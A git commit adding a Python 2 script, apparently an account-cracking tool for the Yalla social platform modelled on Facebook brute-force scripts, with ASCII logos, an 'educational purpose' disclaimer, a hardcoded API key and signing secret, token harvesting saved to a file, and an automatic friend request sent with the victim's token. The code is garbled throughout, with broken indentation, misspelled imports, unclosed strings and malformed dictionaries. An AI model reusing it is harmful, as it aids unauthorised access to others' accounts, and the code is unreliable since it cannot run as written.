04079f87171d3e4884d773b1a801b34aa1c4d5f5
BX2-HackerExploit <66146407+BX2-HackerExploit@users.noreply.github.com>
2020-07-15 13:52:11 +0300

    Add files via upload

---
+++ BX2ON.py
@@ -0,0 +1,385 @@
+
+
+#!/usr/bin/python2
+#coding=utf-8
+#The Credit For This Code Goes To BX2
+#If You Wanna Take Credits For This Code, Please Look Yourself
+#Reserved2020
+import os,sys,time,datetime,random,random,hashlib,er,threding,json,urllib,cookielib,requests,mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+
+
+
+ reload(sys)
+ sys.setdefaultencoding('utf8')
+ br = mechanize.Browser()
+ br.set_handle_robots(False)
+ br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+ br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+ 
+ 
+ def keluar():
+   print "\033[1;96m[!] \x1b[1;91mExit
+   os.sys.exit()
+
+   
+  def acak(b):
+    w = 'ahtdzjc'
+    d = ""
+    for i in x:
+      d += '!'+w[random.randint(0,len(w)-1)]+i
+      return cetak(d)
+      
+      
+   def acak(b):
+     w = 'ahtdzjc'
+     for i in w:
+       d += '!'+w[random.randint(0,len(w)-1)]+i
+       return cetak(d)
+       
+       
+    def cetak(b):
+      w = 'ahtdzjc'
+      for i in w:
+        j = w.index(i)
+        
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+        x += '\033[0m
+        x = x.replace('!0','\033[0m')
+        sys.stdout.write(x+'\n')
+        
+        
+     def jalan(z):
+       for e in z + '\n':
+         sys.stdout.write(e)
+         sys.stdout.flush()
+         time.sleep(00000.1)
+         
+         
+         
+         
+         
+         
+         
+       
+        
+        
+     
+   #### LOGO ####
+   logo = """
+   \033[1;96m .----------.         .----------.
+      \   (  ||    ||  )  / \   (   ||    || )     /
+       \   ~-||====||-~  /   \   ~--||====||-~    /
+        \    ||    ||   /     \     ||    ||    /
+        |    ||====||  /      |     ||====||   /
+        |__  ||    ||  |  B  |___  ||    ||  |
+        | |\ ||====||__|  X  |  |\ ||====||__|
+        | | \      /|  |  2   |  | \       /| |
+        | |  \    / |  |  H   |  |   \    / | |
+        | |   \__|  |  |  A   |  |     \__| | |
+        | |   |__|  |  |      |  |     |__| | |
+        | |   /  |  |  |  K   |  |     /  | | |
+        | |  /    \ |  |  E   |  |   /    \ | |
+        | | /      \|  |      |  | /       \| |
+        |_|/        |__|  R   |__|/         \_|
+        |              |  HK  |               |
+        |              |      |               |
+        /              \      /                \
+       /                \    /                   \
+      /                  \ /
+    
+     
+\033[1;91m⁑⁑ — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — ⁑⁑\033[1;91m⁑⁑  —
+ \033[1;91m⁑⁑ — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — ⁑⁑
+       
+      
+      
+    
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+    """
+    def tik():
+      titik = ['. ','.. ','... ']
+      print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)
+     
+     
+     back = 0
+     berhasil = []
+     cekpoint = []
+     oks = []
+     id = []
+     listgrup = []
+     vulnot = "\033[31mNot Vuln"
+     vuln = "\033[32mVuln"
+
+     
+     
+
+   os.system("clear")
+   print   """
+   \033[1;91m.—————————————————————————————————————————|—| 
+   \033[1;91m..........................................| |
+   \033[1;91m..........................................| |
+   \033[1;92m.—————————————————————————————————————————|—|
+   \033[1;92m.                                         | |
+   \033[1;91m.             ★           ★              | |                                          |            
+   \033[1;92m.—————————————————————————————————————————|—| 
+   \033[1;92m.                                         | |
+   \033[1;92m.                                         | |
+   \033[1;92m.—————————————————————————————————————————|—|
+   \033[1;91m♥.......•*¨`*•.Syria .•*¨`*•. ♥ .•*¨`*•.
+   \033[1;91m♥.......•*¨`*•.Syria .•*¨`*•. ♥ .•*¨`*•.
+   \033[1;97m WE ARE ANONYMUS.THIS TOOL IS ONLY FOR 
+   \033[1;93mEDUCATIONl PURPOSE.I AM NOT 
+   \033[1;93mRESPONSIBLE FOR ANY ILLEGAL
+   \033[1;93mACTIVITY.THIS CHANNEL AND
+   \033[1;97mTOOL DOES NOT PORMOTE ANY ILLEGAL ACTIVITY
+   \033[1;96m♥.......•*¨`*•. ☆ .•*¨`*•. ♥ .•*¨`*•. ☆ .•*¨`*•.......♥
+   
+ 
+ 
+
+
+ CorrectUsername = "RB"
+ CorrectUsername = "HASAN"
+ loop = 'true
+ while (loop == 'true'):
+   username = raw_input("\033[1;91m🙨 \x1b[1;95mEnter Username \x1b[1;91m🙨 \x1b[1;91m")
+   if (username == CorrectUsername):
+     password = raw_input("\033[1;91m🙨 \x1b[1;95mEnter Password \x1b[1;91m🙨 \x1b[1;91m")
+     if (password == CorrectPassword):
+       print "Logged in successfully as " + username
+       time.sleep(2)
+       loop = 'false'
+      else:
+        print "\033[1;96mWrong Password"
+        os.system('xdg-open https://youtu.be/X8qfQ3Aynzk')
+        else:
+          print "\033[1;96mWrong Username"
+          os.system('xdg-open https://youtu.be/X8qfQ3Aynzk')
+          def login():
+            os.system('clear')
+            
+          try:
+            
+            toket = open('login.txt','r')
+            
+            menu() 
+            except (KeyError,IOError):
+              os.system('clear')
+              
+              print logo
+              print 42*"\033[1;96m="
+              print('\033[1;96m[‼🙝] \x1b[1;91m↦↦Login With Fresh ID↤↤\x1b[1;93m[🙟‼]' )
+              id = raw_input('\033[1;93m[⎄] \x1b[0;34mEnter ID/Email \x1b[1;95m: \x1b[1;95m')
+              pwd = raw_input('\033[1;95m[⎄] \x1b[0;34mEnter Password \x1b[1;93m: \x1b[1;93m')
+              tik()
+              try:
+                br.open('www.yalla.live')
+                except mechanize.URLError:
+                  print"\n\033[1;96m[!] \x1b[1;91mThere is no connection"
+                  keluar()
+                  br._factory.is_html = True
+                  br.select_form(nr=0)
+                  br.form['email'] = id
+                  br.form['pass'] = pwd
+                  br.submit()
+                  url = br.geturl()
+                  if 'save-device' in url:
+                      
+                        try:
+                            
+                            sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwp+'+return_ssl_resources=0v1.062f8ce9f74b2f84c13cc23437a4a32
+                            data = {"api_key":"882a8490361da98702bf97a021ddc14d", "credentials_type":, "password" ,"email":id, "format" : "JSON" ,"generate_ machine_id": "1",generate_cookies" :"1" "generate_session_cookies":"1","local","en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+                            x=hashlib.new("md5")
+                            x.update(sig)
+                            a=x.hexdigest()
+                            data.update({'sig':a})
+                            url = "https://api.yalla.live.com/restserver.php"
+                            r=requests.get(url,params=data)
+                            z=json.loads(r.text)
+                            unikers = open("login.txt", 'w')
+                            unikers.write(z['access_token'])
+                            unikers.close()
+                            print '\n\033[1;96m[✓] \x1b[1;92mLogin Done✔'
+                            os.system('xdg-open https://youtu.be/X8qfQ3Aynzk')
+                           requests.post('https://graph.yalla.live.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+                           menu()
+                           except requests.exceptions.ConnectionError:
+                                  
+                                  print"\n\033[1;96m[!] \x1b[1;91mThere is no connection"
+                                  
+                             keluar()
+                    
+                     if 'checkpoint' in url:
+                       
+                       print("\n\033[1;96m[!] \x1b[1;91mMay Be Your Account On Checkpoint")
+                       os.system('rm -rf login.txt')
+                       time.sleep(1)
+                       keluar()
+                       
+                      else:
+                        print("\n\033[1;96m[!] \x1b[1;91mWrong Password/Email⮽")
+                       os.system('rm -rf login.txt')
+                       time.sleep(1)
+                       login()
+                       
+  
+  
+  
+                       
+
+     def menu():
+                    os.system('clear')  
+                       try:
+                         toket=open('login.txt','r').read()
+                         except IOError:
+                                    
+                           os.system('clear')
+                           print"\x1b[1;91m[!] Token invalid"
+                           os.system('rm -rf login.txt')
+                           time.sleep(1)
+                           login()
+                           
+                           
+        try:
+          otw = requests.get('https://graph.yalla.live.com/me?access_token='+toket)
+          a = json.loads(otw.text)
+          nama = a['name'] 
+          id   = a['id']
+          ots  = requests.get('https://graph.yalla.live.com/me/subscribers?access_token='+toket)
+          b    = json.loads(ots.text)
+          sub  = str(b['summary'])['total_count']
+          except keyError:
+            os.system('clear')
+            print"\033[1;91mYour Account is on Checkpoint"
+            os.system('rm -rf login.txt')
+            time.sleep(1)
+            login()
+            
+            except requests.exceptions.ConnectionError:
+              
+              print"\x1b[1;92mThere is no internet connection"
+               keluar()
+               
+               os.systeme("clear")
+               print logo
+               
+               
+               print "\033[1;36;40m       █❚══════════════════════════════════════█❚"
+               print "\033[1;36;40m       █❚\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"                                  \033[1;36;40m█❚"        
+               print "\033[1;36;40m       █❚\033[1;34;40m[*] ID \033[1;34;40m: "+id+"                \033[1;36;40m█❚"                              
+               print "\033[1;36;40m       █❚\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                                   \033[1;36;40m█❚"                                      
+               print "\033[1;36;40m       █❚══════════════════════════════════════█❚"
+               print "     \033[1;32;40m[1] \033[1;33;40m‹⮑※⮐›Let's Start"
+               print "     \033[1;32;40m[2] \033[1;33;40m‹⮑※⮐›Update"
+               print "     \033[1;32;40m[0] \033[1;33;40m‹⮑※⮐›Logout"
+               
+          pilih()
+          
+                                     
+                           
+                           
+                           
+                           
+        def pilih():
+          
+            unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
+                if unikers =="":
+                  print "\x1b[1;91mFill in correctly"
+                  pilih()
+                  
+                  
+        elif unikers =="1":  
+               super()
+               
+         elif unikers =="2":   
+               os.system('clear')
+               print logo
+               
+               
+           
+                
+                           
+                         
+                         
+                       
+                              
+                             
+                           
+                            
+                            
+                            
+                            
+                            
+                            
+                          
+                            
+
+                            
+                            
+                           
+                            
+                            
+                            
+                              
+                            
+                         
+                          
+                     
+                    
+                  
+                  
+                  
+                  
+                  
+                  
+                  
+                  
+                
+                
+                
+                
+              
+               
+              
+              
+              
+            
+          
+            
+              
+            
+        
+           
+          
+        
+        
+        
+       
+     
+  
+
+
+
+    
